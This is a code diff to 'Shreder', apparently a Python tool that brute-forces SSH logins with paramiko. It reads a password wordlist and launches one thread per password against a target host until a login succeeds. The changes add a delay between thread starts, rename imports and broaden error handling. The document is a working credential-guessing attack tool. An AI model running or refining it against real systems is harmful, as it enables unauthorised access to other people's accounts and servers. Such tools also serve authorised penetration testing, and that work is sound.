@@ -26,11 +26,14 @@
 
 import paramiko
 
-from threading import Thread
+from time import sleep as ssh_delay
+from threading import Thread as ssh_thread
+
 from .badges import Badges
 
 class Shreder(Badges):
     password = None
+    ssh_delay = 0.1
 
     def connect(self, host, port, username, password):
         ssh = paramiko.client.SSHClient()
@@ -39,7 +42,7 @@ class Shreder(Badges):
         try:
             ssh.connect(host, port=int(port), username=username, password=password)
             self.password = password
-        except paramiko.AuthenticationException:
+        except Exception:
             ssh.close()
 
     def brute(self, host, port, username, dictionary):
@@ -50,7 +53,7 @@ class Shreder(Badges):
             for password in lines:
                 if password.strip():
                     threads.append(
-                        Thread(
+                        ssh_thread(
                             target=self.connect,
                             args=[host, port, username, password]
                         )
@@ -59,10 +62,12 @@ class Shreder(Badges):
             counter = 1
             for thread in threads:
                 if not self.password:
-                    self.print_multi(f"Proceeding... ({str(counter)}/{str(len(lines))})")
+                    self.print_multi(f"Starting SSH threads... ({str(counter)}/{str(len(lines))})")
+                    ssh_delay(self.ssh_delay)
+
                     thread.start()
                     counter += 1
-            
+
             for thread in threads:
                 thread.join()
 
